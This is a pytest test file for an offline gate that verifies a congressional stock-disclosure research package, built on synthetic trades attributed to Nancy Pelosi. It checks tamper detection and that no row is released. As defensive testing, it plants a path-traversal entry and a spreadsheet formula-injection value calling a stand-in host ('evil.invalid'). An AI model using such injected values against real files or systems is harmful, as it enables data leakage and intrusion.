"""Offline E1.24 release gate: deterministic zero-write plan and tamper checks."""
from __future__ import annotations

import csv
import hashlib
import json
import os
from pathlib import Path
import shutil

import pytest

from congress_release_gate import (
    ReleaseGateError, _canonical, verify_research_package, write_hold_report, main,
)

SNAPSHOT = 'a' * 64


def sha(x: bytes) -> str:
    return hashlib.sha256(x).hexdigest()


def write_json(path: Path, body: dict):
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(body, sort_keys=True, indent=2) + '\n', encoding='utf-8')


def write_jsonl(path: Path, rows: list[dict]):
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(b''.join(_canonical(x) + b'\n' for x in rows))


def row(idx: int, *, quarantine: bool) -> dict:
    raw = {'memberName': 'Nancy Pelosi', 'ticker': 'NVDA' if idx == 1 else 'MSFT',
           'filingId': f'fake-source-{idx}', 'transactionDate': '2026-05-01',
           'disclosureDate': '2026-06-01', 'type': 'Purchase',
           'sourceLink': None if quarantine else 'https://disclosures-clerk.house.gov/public_disc/ptr-pdfs/2026/20000001.pdf'}
    return {
        'row_index': idx, 'research_event_id': f'event-{idx}', 'ticker': raw['ticker'],
        'transaction_date': raw['transactionDate'], 'filing_date': raw['disclosureDate'],
        'asset_type_reported': 'Stock', 'action_reported': 'Purchase',
        'source_filing_id': raw['filingId'], 'official_filing_url': raw['sourceLink'],
        'quality_status': 'quarantined_review_required' if quarantine else 'structurally_clean_source_unverified',
        'reason_codes': ['missing_or_untrusted_official_filing_url'] if quarantine else [],
        'raw_record': raw, 'raw_record_sha256': sha(_canonical(raw)),
        'snapshot_sha256': SNAPSHOT, 'semantic_group_id': None,
        'first_seen_at': None, 'official_filing_verified': False,
        'eligible_for_ingestion': False, 'eligible_for_execution': False,
    }


def regenerate_all_manifest_hashes(root: Path):
    """Refresh *local* hashes after deliberate mutation to test semantic gates."""
    for sub, manifest, key in [
        ('e117', 'pelosi_e117_summary.json', 'output_files_sha256'),
        ('e118', 'pelosi_e118_manifest.json', 'output_sha256'),
        ('e119', 'pelosi_e119_manifest.json', 'output_sha256'),
        ('e120', 'pelosi_e120_manifest.json', 'local_artifact_sha256'),
    ]:
        path = root / sub / manifest
        data = json.loads(path.read_text())
        for name in list(data[key]):
            data[key][name] = sha((root / sub / name).read_bytes())
        write_json(path, data)
    p = root / 'e123_manifest.json'
    data = json.loads(p.read_text())
    for filename in list(data['artifact_hashes_sha256']):
        data['artifact_hashes_sha256'][filename] = sha((root / filename).read_bytes())
    write_json(p, data)


def fixture(tmp_path: Path) -> Path:
    root = tmp_path / 'synthetic_e123'
    for sub in ('e117', 'e118', 'e119', 'e120'):
        (root / sub).mkdir(parents=True)
    clean, hold = row(1, quarantine=False), row(2, quarantine=True)
    write_jsonl(root / 'e117/pelosi_e117_clean_research.jsonl', [clean])
    write_jsonl(root / 'e117/pelosi_e117_quarantined_review.jsonl', [hold])
    task = {**hold, 'task_id': 'e118-task-2', 'queue_status': 'pending_original_filing_evidence'}
    write_jsonl(root / 'e118/pelosi_e118_research_only.jsonl', [clean])
    write_jsonl(root / 'e118/pelosi_e118_human_review_queue.jsonl', [task])
    (root / 'e118/pelosi_e118_semantic_duplicate_groups.csv').write_text('group_id,number_of_rows\n')
    (root / 'e119/pelosi_e119_audit_ledger.jsonl').write_bytes(b'')
    with (root / 'e119/pelosi_e119_review_status.csv').open('w', newline='') as fp:
        w = csv.DictWriter(fp, fieldnames=['task_id', 'review_status', 'eligible_for_ingestion', 'eligible_for_execution'])
        w.writeheader()
        w.writerow({'task_id': 'e118-task-2', 'review_status': 'awaiting_two_reviewers',
                    'eligible_for_ingestion': False, 'eligible_for_execution': False})
    (root / 'e120/pelosi_e120_house_pdf_request_manifest.csv').write_text('request_id\n')
    (root / 'e120/pelosi_e120_missing_provenance_queue.csv').write_text('task_id\ne118-task-2\n')

    write_json(root / 'e117/pelosi_e117_summary.json', {
        'status': 'NO_GO_RESEARCH_ONLY_SOURCE_UNVERIFIED',
        'source_snapshot_sha256': SNAPSHOT, 'total_rows': 2,
        'structurally_clean_unverified_rows': 1, 'quarantined_rows': 1,
        'output_files_sha256': {p.name: '' for p in (root / 'e117').glob('*.jsonl')},
    })
    write_json(root / 'e118/pelosi_e118_manifest.json', {
        'source_sha256': SNAPSHOT, 'source_rows': 2,
        'review_queue': 1, 'clean_unverified': 1,
        'output_sha256': {p.name: '' for p in (root / 'e118').iterdir()},
    })
    # exclude own manifest from map
    e118 = root / 'e118/pelosi_e118_manifest.json'
    obj = json.loads(e118.read_text())
    obj['output_sha256'].pop(e118.name, None)
    write_json(e118, obj)
    write_json(root / 'e119/pelosi_e119_manifest.json', {
        'source_snapshot_sha256': SNAPSHOT,
        'review_events': 0, 'source_authenticated_pdf_count': 0,
        'status_counts': {'awaiting_two_reviewers': 1},
        'ingestion_approved': False, 'execution_approved': False,
        'output_sha256': {p.name: '' for p in (root / 'e119').iterdir()},
    })
    o = root / 'e119/pelosi_e119_manifest.json'
    data = json.loads(o.read_text())
    data['output_sha256'].pop(o.name, None)
    write_json(o, data)
    write_json(root / 'e120/pelosi_e120_manifest.json', {
        'source_snapshot_sha256': SNAPSHOT, 'quarantined_tasks': 1,
        'potential_duplicate_groups': 0, 'distinct_document_requests': 0,
        'missing_or_untrusted_link_tasks': 1,
        'house_pdf_origin_authenticated': 0, 'official_filing_verified': 0,
        'reviewer_decisions': 0, 'supabase_writes': 0, 'broker_orders': 0,
        'local_artifact_sha256': {p.name: '' for p in (root / 'e120').iterdir()},
    })
    o = root / 'e120/pelosi_e120_manifest.json'
    data = json.loads(o.read_text())
    data['local_artifact_sha256'].pop(o.name, None)
    write_json(o, data)
    all_files = [str(p.relative_to(root)) for p in root.glob('e*/pelosi_*')]
    write_json(root / 'e123_manifest.json', {
        'version': 'E1.23.0', 'status': 'NO_GO_READ_ONLY_RESEARCH',
        'source_snapshot_sha256': SNAPSHOT, 'total_source_rows': 2,
        'structurally_clean_source_unverified': 1,
        'quarantined_human_review_required': 1, 'potential_duplicate_groups': 0,
        'ingestion_approved': False, 'execution_approved': False,
        'historical_completeness_verified': False, 'first_seen_at_established': False,
        'scheduled_sync_enabled': False,
        'external_http_requests': 0, 'supabase_writes': 0, 'broker_orders': 0,
        'pdf_files_authenticated': 0, 'reviewer_evidence_events': 0,
        'artifact_hashes_sha256': {f: '' for f in all_files},
    })
    regenerate_all_manifest_hashes(root)
    return root


def test_synthetic_fully_on_hold(tmp_path):
    checked = verify_research_package(fixture(tmp_path))
    assert checked['summary']['approved_for_ingestion_rows'] == 0
    assert checked['summary']['approved_for_trading_rows'] == 0
    assert checked['summary']['total_source_rows'] == 2
    assert checked['summary']['release_holds_by_status'] == {
        'HOLD_QUARANTINED': 1, 'HOLD_SOURCE_UNVERIFIED': 1}
    assert {x['row_index'] for x in checked['hold_queue']} == {1, 2}
    assert all(x['eligible_for_ingestion'] is False and x['first_seen_at'] is None
               for x in checked['hold_queue'])


def test_reproduces_byte_identical_outputs(tmp_path):
    data = verify_research_package(fixture(tmp_path))
    one = write_hold_report(data, tmp_path / 'one')
    two = write_hold_report(data, tmp_path / 'two')
    assert one['manifest']['local_artifacts_sha256'] == two['manifest']['local_artifacts_sha256']
    assert (tmp_path / 'one/pelosi_e124_release_readiness.json').read_bytes() == (tmp_path / 'two/pelosi_e124_release_readiness.json').read_bytes()
    with (tmp_path / 'one/pelosi_e124_hold_queue.csv').open(encoding='utf-8-sig', newline='') as fp:
        assert len(list(csv.DictReader(fp))) == 2
    with pytest.raises(ReleaseGateError, match='new local output'):
        write_hold_report(data, tmp_path / 'one')


def test_missing_output_or_tampered_e123_artifact_refused(tmp_path):
    root = fixture(tmp_path)
    (root / 'e118/pelosi_e118_human_review_queue.jsonl').write_text('CORRUPTED')
    with pytest.raises(ReleaseGateError, match='Artifact SHA-256 mismatch'):
        verify_research_package(root)


def test_cross_phase_row_change_refused_even_if_all_manifests_rehashed(tmp_path):
    root = fixture(tmp_path)
    path = root / 'e118/pelosi_e118_human_review_queue.jsonl'
    task = json.loads(path.read_text())
    task['action_reported'] = 'Sale'
    write_jsonl(path, [task])
    regenerate_all_manifest_hashes(root)
    with pytest.raises(ReleaseGateError, match='silently changed source evidence'):
        verify_research_package(root)


def test_raw_source_hash_change_refused_even_if_all_manifests_rehashed(tmp_path):
    root = fixture(tmp_path)
    path = root / 'e117/pelosi_e117_quarantined_review.jsonl'
    task = json.loads(path.read_text())
    task['raw_record']['ticker'] = 'MALICIOUS'
    write_jsonl(path, [task])
    regenerate_all_manifest_hashes(root)
    with pytest.raises(ReleaseGateError, match='Original source row checksum mismatch'):
        verify_research_package(root)


def test_e119_status_promotion_refused_even_if_hashes_recomputed(tmp_path):
    root = fixture(tmp_path)
    path = root / 'e119/pelosi_e119_review_status.csv'
    path.write_text(path.read_text().replace('awaiting_two_reviewers', 'two_reviewers_concordant_offline_only'))
    regenerate_all_manifest_hashes(root)
    with pytest.raises(ReleaseGateError, match='review status unexpectedly advanced'):
        verify_research_package(root)


def test_trading_flag_in_e123_manifest_refused(tmp_path):
    root = fixture(tmp_path)
    path = root / 'e123_manifest.json'
    data = json.loads(path.read_text())
    data['execution_approved'] = True
    write_json(path, data)
    with pytest.raises(ReleaseGateError, match='release or completeness'):
        verify_research_package(root)


def test_symlink_source_refused(tmp_path):
    root = fixture(tmp_path)
    link = tmp_path / 'link'
    link.symlink_to(root, target_is_directory=True)
    with pytest.raises(ReleaseGateError, match='local, nonsymlink'):
        verify_research_package(link)


def test_symlink_nested_artifact_refused(tmp_path):
    root = fixture(tmp_path)
    file = root / 'e117/pelosi_e117_clean_research.jsonl'
    moved = tmp_path / 'real'
    shutil.move(file, moved)
    file.symlink_to(moved)
    with pytest.raises(ReleaseGateError, match='Unsafe or missing'):
        verify_research_package(root)


def test_no_socket_connection_even_when_cli_writes(tmp_path, monkeypatch, capsys):
    import socket
    monkeypatch.setattr(socket.socket, 'connect',
                        lambda *a, **k: (_ for _ in ()).throw(AssertionError('network attempt')))
    root = fixture(tmp_path)
    assert main([str(root), '--output-dir', str(tmp_path / 'out')]) == 0
    result = json.loads(capsys.readouterr().out)
    assert result['approved_rows'] == 0
    assert result['rows_on_hold'] == 2


def test_missing_nested_fingerprint_rejected(tmp_path):
    root = fixture(tmp_path)
    file = root / 'e120/pelosi_e120_manifest.json'
    body = json.loads(file.read_text())
    body['source_snapshot_sha256'] = 'b' * 64
    write_json(file, body)
    data = json.loads((root / 'e123_manifest.json').read_text())
    data['artifact_hashes_sha256']['e120/pelosi_e120_manifest.json'] = sha(file.read_bytes())
    write_json(root / 'e123_manifest.json', data)
    with pytest.raises(ReleaseGateError, match='Cross-phase snapshot lineage'):
        verify_research_package(root)


def test_optional_real_archived_e123_snapshot():
    location = os.getenv('E124_E123_PACKAGE_DIR')
    if not location:
        pytest.skip('Private real snapshot not embedded in GitHub CI')
    r = verify_research_package(location)
    summary = r['summary']
    assert summary['source_snapshot_sha256'] == '4165d091ccf389f9eb4a5012adcc88ea9241b56bc086b6fed03be3249383c5f3'
    assert (summary['total_source_rows'], summary['source_unverified_research_rows'],
            summary['quarantined_rows'], summary['pending_duplicate_groups']) == (147, 75, 72, 12)
    assert summary['missing_link_tasks'] == 21
    assert summary['human_review_tasks_pending'] == 72
    assert summary['approved_for_ingestion_rows'] == 0
    assert summary['approved_for_trading_rows'] == 0


def test_e118_duplicate_index_refused_even_if_rehashed(tmp_path):
    root = fixture(tmp_path)
    path = root / 'e118/pelosi_e118_human_review_queue.jsonl'
    task = json.loads(path.read_text())
    task['row_index'] = 1
    write_jsonl(path, [task])
    regenerate_all_manifest_hashes(root)
    with pytest.raises(ReleaseGateError, match='Duplicate E1.18 row index'):
        verify_research_package(root)


def test_e119_fake_authenticated_pdf_refused_even_if_rehashed(tmp_path):
    root = fixture(tmp_path)
    path = root / 'e119/pelosi_e119_review_status.csv'
    with path.open(newline='') as fp:
        rows = list(csv.DictReader(fp))
    rows[0]['official_filing_verified'] = 'True'
    columns = list(rows[0].keys())
    with path.open('w', newline='') as fp:
        writer = csv.DictWriter(fp, fieldnames=columns)
        writer.writeheader()
        writer.writerows(rows)
    regenerate_all_manifest_hashes(root)
    with pytest.raises(ReleaseGateError, match='review status unexpectedly advanced'):
        verify_research_package(root)


def test_no_arbitrary_paths_allowed_in_manifest(tmp_path):
    root = fixture(tmp_path)
    manifest = root / 'e123_manifest.json'
    payload = json.loads(manifest.read_text())
    payload['artifact_hashes_sha256']['../../outside.txt'] = 'c' * 64
    write_json(manifest, payload)
    with pytest.raises(ReleaseGateError, match='Unsafe E1.23 artifact path'):
        verify_research_package(root)


def test_csv_formula_injection_rejected_as_cell(tmp_path):
    root = fixture(tmp_path)
    file = root / 'e117/pelosi_e117_clean_research.jsonl'
    rowdata = json.loads(file.read_text())
    rowdata['ticker'] = '=WEBSERVICE("https://evil.invalid")'
    write_jsonl(file, [rowdata])
    # To keep the row equal across the stages and pass stage integrity,
    # update E1.18 and all nested hashes too. Only the display value changed.
    e118_file = root / 'e118/pelosi_e118_research_only.jsonl'
    second = json.loads(e118_file.read_text())
    second['ticker'] = rowdata['ticker']
    write_jsonl(e118_file, [second])
    regenerate_all_manifest_hashes(root)
    r = verify_research_package(root)
    write_hold_report(r, tmp_path / 'output')
    with (tmp_path / 'output/pelosi_e124_hold_queue.csv').open(encoding='utf-8-sig', newline='') as fp:
        values = list(csv.DictReader(fp))
    assert values[0]['ticker'].startswith("'=")
    assert r['summary']['approved_for_trading_rows'] == 0


def test_source_deletion_is_blocked_before_any_output(tmp_path):
    root = fixture(tmp_path)
    (root / 'e117/pelosi_e117_summary.json').unlink()
    output = tmp_path / 'never_created'
    with pytest.raises(ReleaseGateError):
        verify_research_package(root)
    assert not output.exists()
